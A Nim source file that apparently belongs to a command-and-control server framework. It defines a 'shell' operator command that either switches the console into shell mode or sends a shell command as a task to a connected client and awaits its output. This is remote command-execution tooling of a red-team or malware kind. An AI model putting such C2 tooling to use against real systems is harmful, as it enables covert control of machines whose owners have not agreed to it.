import asyncdispatch, strutils, tables

import ../../types
import ../../logging
import ../../communication

import ../../../clientTasks/shell

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    infoLog "entering shell mode, use 'back' to exit"
    server.cli.mode = ShellMode
  else:
    let task = await shell.sendTask(server.cli.handlingClient, args[0])
    await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "shell",
  argsLength: 0,
  usage: @["shell", "shell \"[command]\""],
  cliMode: @[ClientInteractMode],
  description: "Send a shell command or enter shell mode when no command is passed",
  category: CCClientInteraction,
  requiresConnectedClient: true
)